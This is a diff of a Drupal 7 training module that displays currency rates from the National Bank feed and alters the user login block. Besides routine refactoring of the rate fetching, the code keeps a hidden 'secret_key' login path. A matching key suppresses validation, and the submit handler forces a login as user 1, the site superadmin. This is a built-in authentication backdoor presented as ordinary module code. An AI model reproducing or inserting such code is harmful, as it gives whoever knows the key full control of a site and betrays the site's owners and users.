@@ -75,6 +75,18 @@ function training2_form_block_view($delta = '') {
 }
 
 /**
+ * Implements hook_theme().
+ */
+function training2_form_theme() {
+  $items['user_login_block'] = array(
+    'render element' => 'form',
+    'template' => 'templates/training2_form_login_template',
+  );
+
+  return $items;
+}
+
+/**
  * Function drupal_map_assoc() uses return array.
 
  * @return array
@@ -82,14 +94,14 @@ function training2_form_block_view($delta = '') {
  */
 function training2_form_conf_content() {
   $xml_array = training2_form_get_xml_data();
-  $array_currency = $xml_array['Currency'];
+  $currency = $xml_array['Currency'];
 
-  $arr_value = array();
-  $n = count($array_currency);
+  $content = array();
+  $n = count($currency);
   for ($i = 0; $i < $n; $i++) {
-    $arr_value[$i] = $array_currency[$i]['CharCode'] . ' - ' . $array_currency[$i]['Rate'];
+    $content[$i] = $currency[$i]['CharCode'] . ' - ' . $currency[$i]['Rate'];
   }
-  return $arr_value;
+  return $content;
 }
 
 /**
@@ -99,28 +111,45 @@ function training2_form_conf_content() {
  *   Return array currency.
  */
 function training2_form_get_xml_data() {
-  $xml_data = simplexml_load_file(TRAINING2_FORM_NBRB_RATES_XML);
-  $json_data = json_encode($xml_data);
+  $ch = curl_init();
+  curl_setopt($ch, CURLOPT_URL, TRAINING2_FORM_NBRB_RATES_XML);
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
+  $xml_response = curl_exec($ch);
 
-  return json_decode($json_data, TRUE);
+  $xml_data = simplexml_load_string($xml_response);
+
+  if ($xml_data) {
+    $json_data = json_encode($xml_data);
+    return $currency = json_decode($json_data, TRUE);
+  }
+  else {
+    watchdog('training2_form', 'Bank\'s server is not available');
+    return FALSE;
+  }
 }
 
 /**
  * Display block content.
  */
 function training2_form_content() {
-  $xmlArray = training2_form_get_xml_data();
-  $date = $xmlArray['@attributes']['Date'];
-  $choose = variable_get('form_currency');
-  $choose_currency = '';
-  if (is_array($choose)) {
-    $clean_array = array_diff($choose, array(0));
-    $choose_currency = implode($clean_array, '<br />');
-  }
-  $dated = date('d-m-Y H:i:s');
-  $result = $date . '<br />' . $choose_currency . '<br /><br />' . $dated;
+  $xml_array = training2_form_get_xml_data();
 
-  return $result;
+  if (empty($xml_array)) {
+    return FALSE;
+  }
+  else {
+    $date = $xml_array['@attributes']['Date'];
+    $choose = variable_get('form_currency');
+    $clean_array = array_diff($choose, array(0));
+    $dated = date('d-m-Y H:i:s');
+    
+    $output = '';
+    foreach ($clean_array as $item) {
+      $output .= '<br />' . $item;
+    }
+    return $date . '<br />' . $output . '<br /><br />' . $dated;
+
+  }
 }
 
 /**
@@ -142,18 +171,13 @@ function training2_form_form_user_login_block_alter(&$form, &$form_state, $form_
 }
 
 /**
- * Validate new login form.
- *
- * @param array $form
- *   Nested array of new login form elements.
- * @param array $form_state
- *   A keyed array containing the current state of the new login form.
+ * Validate handler for new login form.
  */
 function training2_form_form_user_login_block_validate($form, &$form_state) {
-
+  // If $form['secret_key'] is empty continue without
+  // training2_form_form_user_login_block_validate.
   if ($form_state['values']['secret_key'] != '') {
     if ($form_state['values']['secret_key'] == TRAINING2_FORM_SECRET_KEY) {
-      form_clear_error();
       drupal_get_messages();
     }
     else {
@@ -164,27 +188,10 @@ function training2_form_form_user_login_block_validate($form, &$form_state) {
 
 /**
  * Submit handler for user_login_block.
- *
- * @param array $form
- *   Nested array of new login form elements.
- * @param array $form_state
- *   A keyed array containing the current state of the new login form.
  */
 function training2_form_form_user_login_block_submit($form, &$form_state) {
   global $user;
   $form_state['uid'] = 1;
   $user = user_load($form_state['uid']);
   user_login_finalize($form_state);
-}
-
-/**
- * Implements hook_theme().
- */
-function training2_form_theme() {
-  $items['user_login_block'] = array(
-    'render element' => 'form',
-    'template' => 'templates/training2_form_login_template',
-  );
-
-  return $items;
 }
